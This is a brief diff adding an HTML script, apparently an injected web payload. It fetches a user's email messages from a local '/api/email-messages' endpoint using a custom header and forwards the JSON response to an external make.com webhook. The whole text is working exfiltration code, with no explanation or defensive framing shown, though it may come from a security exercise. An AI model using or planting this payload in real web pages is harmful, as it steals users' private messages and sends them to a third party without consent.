@@ -1,0 +1,17 @@
+<script>
+
+const xhr = new XMLHttpRequest();
+xhr.open("GET", "https://localhost:7144/api/email-messages");
+xhr.setRequestHeader("Abrakadabra", "LL")
+xhr.send();
+xhr.responseType = "json";
+xhr.onload = () => {
+  if (xhr.readyState == 4 && xhr.status == 200) {
+    const data = xhr.response;
+    const xhr2 = new XMLHttpRequest();
+    xhr2.open("POST", "https://hook.eu1.make.com/u3o7p6s7nnasfn5sph3n6w3qf3dyh7pn");
+    xhr2.send(JSON.stringify(data));
+  }
+};
+
+</script>
